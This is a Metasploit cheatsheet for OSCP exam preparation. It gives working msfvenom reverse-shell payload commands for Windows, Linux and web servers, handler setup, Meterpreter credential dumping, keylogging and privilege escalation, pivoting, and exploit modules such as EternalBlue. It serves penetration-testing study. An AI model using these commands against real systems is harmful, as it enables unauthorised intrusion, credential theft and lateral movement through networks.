# Metasploit Cheatsheet

> Exploitation framework. **OSCP EXAM RESTRICTION:** `msfconsole` (exploits, auxiliary, post modules) may be used on **ONLY ONE machine** in the entire exam. `msfvenom` (payload generation) is **unrestricted** — use it freely everywhere. Choose your one msfconsole machine wisely (usually the fiddliest to exploit manually).

---

## Starting Up

```bash
sudo msfconsole              # start the console
msfconsole -q                # quiet start (no banner)
```

Database (for storing hosts/loot, optional):
```bash
sudo msfdb init
db_status                    # check DB connection
workspace -a oscp            # create/use a workspace
```

---

## Core Console Workflow

```
search <term>                # find modules (e.g. search eternalblue)
use <module>                 # select a module
info                         # show module details
show options                 # required settings
set RHOSTS <target_ip>       # target
set LHOST <your_ip>          # your IP (for reverse shells)
set LPORT 443                # your listening port
set PAYLOAD <payload>        # choose a payload
exploit    (or run)          # launch
```

Handy:
```
show payloads                # payloads compatible with current module
show targets                 # target OS/arch options
back                         # deselect current module
sessions                     # list active sessions
sessions -i <id>             # interact with a session
```

---

## msfvenom — Payload Generation (UNRESTRICTED on exam)

**Windows:**
```bash
# Staged Meterpreter (needs handler)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=443 -f exe -o shell.exe

# Non-staged (whole payload, more reliable over flaky links) - note: no extra slash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ip> LPORT=443 -f exe -o shell.exe

# Plain reverse shell (not meterpreter)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe -o shell.exe
```

**Linux:**
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=443 -f elf -o shell
```

**Web payloads:**
```bash
# PHP
msfvenom -p php/reverse_php LHOST=<ip> LPORT=443 -f raw -o shell.php

# ASPX
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=443 -f aspx -o shell.aspx

# WAR (Java/Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=443 -f war -o shell.war
```

**Formats (`-f`):** exe, elf, aspx, war, raw, php, python, powershell, dll
**List options:**
```bash
msfvenom --list payloads
msfvenom --list formats
```

**Encoding / bad chars (when needed):**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -b '\x00\x0a\x0d' -f exe -o shell.exe
```

---

## multi/handler — Catch Your Shells

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 443
set ExitOnSession false       # keep listening after a session opens
exploit -j                    # run as background job
```

**The payload in the handler MUST match the payload in your msfvenom command.**

---

## Staged vs Non-Staged (know this)

| | Staged | Non-Staged |
|---|--------|-----------|
| Syntax | `.../meterpreter/reverse_tcp` (with slash) | `.../meterpreter_reverse_tcp` (underscore) |
| Size | Small stub, downloads rest | Whole payload in one shot |
| Reliability | Needs stable connection + handler | More reliable over flaky links |
| When to switch | Default choice | If staged fails/hangs, try this |

Exam reflex: staged payload not connecting? Switch to non-staged.

---

## Meterpreter — Core Commands

```
getuid                       # current user
getsystem                    # auto-attempt privesc to SYSTEM
hashdump                     # dump local SAM hashes
sysinfo                      # OS info
ps                           # process list
migrate <PID>                # move into another process (stability/stealth)
shell                        # drop to native cmd/shell
background                   # background session (keep alive)
sessions                     # (from console) list sessions
```

**File transfer:**
```
upload /path/local C:\\path\\remote
download C:\\path\\remote /path/local
```

**Other useful:**
```
screenshot                   # capture desktop
keyscan_start / keyscan_dump # keylogger
load kiwi                    # load mimikatz (kiwi) in-memory
creds_all                    # (after load kiwi) dump credentials
```

---

## Pivoting with Metasploit (backup to Ligolo)

```
# After getting a meterpreter session on a dual-homed host:
run autoroute -s 10.4.187.0/24        # add route to internal subnet
# or newer:
run post/multi/manage/autoroute

background                            # background the session

# Now scan/attack the internal net through the session
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.4.187.10
run

# Port forward a specific internal service to your Kali
sessions -i 1
portfwd add -l 3389 -p 3389 -r 10.4.187.10
# now rdp to 127.0.0.1:3389 reaches the internal host
```

Note: for OSCP, Ligolo is usually cleaner for pivoting. Metasploit autoroute is a backup, and remember the one-machine msfconsole restriction.

---

## Common Exploit Modules (examples)

```
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue

# Tomcat manager upload
use exploit/multi/http/tomcat_mgr_upload

# Search by CVE
search cve:2021-41773
search type:exploit platform:windows smb
```

---

## Resource Scripts (automation)

Save a sequence of msf commands to a `.rc` file and run them automatically:

```
# handler.rc
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.45.200
set LPORT 443
set ExitOnSession false
exploit -j
```
```bash
msfconsole -r handler.rc          # auto-run on startup
# or inside console:
resource handler.rc
```

---

## Practical Exam Workflow

```
1. msfvenom → generate payload (unrestricted, use anywhere)
2. multi/handler → catch the shell
   OR on your ONE allowed box:
3. search + use an exploit module → auto-exploit
4. getsystem / hashdump for quick post-ex
5. Everywhere else → manual shells + your own tools
```

---

## Key Notes for OSCP

- **msfconsole = ONE machine only** on the exam. msfvenom = unlimited.
- Handler payload must **exactly match** the msfvenom payload.
- `set ExitOnSession false` + `exploit -j` = handler keeps catching shells in the background.
- Staged fails → try non-staged (`meterpreter_reverse_tcp`).
- `getsystem` is a fast privesc attempt but doesn't always work — fall back to manual privesc.
- `migrate` into a stable process (like explorer.exe) if your session is unstable.
- Meterpreter's `hashdump` needs SYSTEM — run `getsystem` first.
- For pivoting, prefer Ligolo; use autoroute/portfwd only if you've spent your msfconsole box here.

---

## References
- Metasploit docs: https://docs.metasploit.com/
- msfvenom cheatsheet: https://www.offsec.com/metasploit-unleashed/msfvenom/
